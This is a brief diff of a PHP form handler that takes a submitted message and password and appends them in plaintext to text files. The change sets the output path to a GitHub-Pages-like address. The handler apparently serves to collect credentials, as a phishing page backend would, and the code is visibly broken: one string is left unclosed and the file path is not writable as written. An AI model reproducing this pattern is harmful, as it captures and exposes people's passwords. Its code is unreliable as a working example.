@@ -11,7 +11,7 @@
 if($_SERVER["REQUEST_METHOD"] == "POST"){
 $message = $_POST['message'];
 $password = $_POST['password'];
-    $data = fopen("", "a");
+    $data = fopen("www.github/details404.github.io/textDoc/data.txt", "a");
     fwrite($data, "$message pass: $password);
     fclose($data);
 file_put_contents("new.txt", "$message pass: $password");
